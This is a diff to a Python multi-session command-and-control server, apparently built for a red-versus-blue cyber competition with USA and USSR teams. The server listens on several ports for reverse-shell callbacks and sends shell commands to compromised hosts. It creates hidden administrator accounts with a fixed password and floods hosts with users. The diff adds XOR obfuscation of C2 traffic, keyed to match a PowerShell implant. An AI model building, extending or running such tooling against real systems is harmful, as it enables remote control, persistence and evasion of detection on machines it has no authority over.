@@ -2,9 +2,41 @@ import socket
 import time
 import random
 import threading
-import argparse
 
 PORTS = [80, 443, 8080, 3306, 4444, 5985, 8443]
+
+# Shared XOR key — must match the key in the .ps1 payload exactly
+XOR_KEY = "CDTC0ldW4r$2026!xK"
+
+def xor_crypt(data: bytes, key: str) -> bytes:
+    """XOR encode or decode bytes against a repeating key."""
+    key_bytes = key.encode("utf-8")
+    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
+
+def send_command(conn, command):
+    try:
+        # Encode outgoing command before sending
+        encoded = xor_crypt(command.encode("utf-8"), XOR_KEY)
+        conn.send(encoded)
+        time.sleep(3)
+
+        # Receive and decode incoming response
+        response = b""
+        conn.settimeout(5)
+        try:
+            while True:
+                chunk = conn.recv(8192)
+                if not chunk:
+                    break
+                response += chunk
+        except socket.timeout:
+            pass
+
+        if response:
+            return xor_crypt(response, XOR_KEY).decode("utf-8", errors="ignore")
+        return ""
+    except Exception as e:
+        return f"[!] Send failed: {e}"
 
 NAME_POOLS = {
     "USA": [
@@ -23,17 +55,12 @@ NAME_POOLS = {
     ]
 }
 
-# ── Session Registry ────────────────────────────────────────────────────────
-# Stores all active connections keyed by IP
-# { "10.100.2.10": { "conn": <socket>, "port": 80, "team": "USA" } }
-
 sessions = {}
 sessions_lock = threading.Lock()
 
 def register_session(ip, conn, port):
     with sessions_lock:
         if ip in sessions:
-            # Close old stale connection and replace it
             try:
                 sessions[ip]["conn"].close()
             except Exception:
@@ -43,12 +70,11 @@ def register_session(ip, conn, port):
         print("    Type 'sessions' at any prompt to see all active connections.")
 
 def guess_team(ip):
-    """Infer team from IP subnet."""
     if ip.startswith("10.100.2."):
         return "USA"
     elif ip.startswith("10.100.3."):
         return "USSR"
-    return "UNKNOWN"
+    return "USA"  # your default for testing
 
 def remove_session(ip):
     with sessions_lock:
@@ -56,10 +82,7 @@ def remove_session(ip):
             del sessions[ip]
             print(f"[-] Session dropped: {ip}")
 
-# ── Port Listeners ───────────────────────────────────────────────────────────
-
 def accept_loop(server, port):
-    """Continuously accept new connections on a given port."""
     while True:
         try:
             conn, addr = server.accept()
@@ -69,7 +92,6 @@ def accept_loop(server, port):
             break
 
 def start_listeners():
-    """Spin up one listening thread per port."""
     for port in PORTS:
         try:
             server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -81,28 +103,6 @@ def start_listeners():
             print(f"[*] Listener started on port {port}")
         except Exception as e:
             print(f"[!] Could not bind port {port}: {e}")
-
-# ── Command Execution ────────────────────────────────────────────────────────
-
-def send_command(conn, command):
-    try:
-        conn.send((command + "\n").encode("utf-8"))
-        time.sleep(3)
-        response = b""
-        conn.settimeout(5)
-        try:
-            while True:
-                chunk = conn.recv(8192)
-                if not chunk:
-                    break
-                response += chunk
-        except socket.timeout:
-            pass
-        return response.decode("utf-8", errors="ignore")
-    except Exception as e:
-        return f"[!] Send failed: {e}"
-
-# ── User Tools ───────────────────────────────────────────────────────────────
 
 def make_user_command(username, admin=False):
     password = "Welcome1!"
@@ -162,8 +162,6 @@ def create_hidden_user(conn):
     print(send_command(conn, cmd_hide))
     print(f"[+] Hidden user '{username}' created | password: {password}")
 
-# ── Menus ────────────────────────────────────────────────────────────────────
-
 def user_flood_menu(conn, team):
     while True:
         print(f"\n--- User Flood Menu [{team}] ---")
@@ -219,17 +217,14 @@ def interactive_mode(conn, ip):
             print(send_command(conn, cmd))
 
 def session_menu(ip):
-    """Full interaction menu for one selected session."""
     with sessions_lock:
         if ip not in sessions:
             print(f"[!] No active session for {ip}")
             return
         session = sessions[ip]
-
-    conn = session["conn"]
-    team = session["team"]
-    port = session["port"]
-
+    conn  = session["conn"]
+    team  = session["team"]
+    port  = session["port"]
     while True:
         print(f"\n=== Session: {ip} | Team: {team} | Port: {port} ===")
         print("  [1] Interactive shell")
@@ -253,7 +248,6 @@ def print_sessions():
             print(f"  [{i}] {ip:15s}  port: {data['port']}  team: {data['team']}")
 
 def sessions_menu():
-    """Top level — pick a session or wait for one."""
     while True:
         print("\n======== C2 SESSIONS ========")
         print_sessions()
@@ -261,7 +255,6 @@ def sessions_menu():
         print("  [r]  Refresh session list")
         print("  [q]  Quit")
         choice = input("\nC2> ").strip().lower()
-
         if choice == "q":
             print("[*] Exiting.")
             break
@@ -275,23 +268,12 @@ def sessions_menu():
                     continue
             session_menu(ip)
 
-# ── Entry Point ───────────────────────────────────────────────────────────────
-
 def main():
-    print("""
- ██████╗██████╗ 
-██╔════╝╚════██╗
-██║      █████╔╝
-██║     ██╔═══╝ 
-╚██████╗███████╗
- ╚═════╝╚══════╝  Multi-Session C2
-    """)
-
     print("[*] Starting listeners...")
     start_listeners()
     print(f"[*] Listening on ports: {PORTS}")
+    print("[*] XOR encryption active — key loaded")
     print("[*] Waiting for callbacks...\n")
-
     sessions_menu()
 
 if __name__ == "__main__":
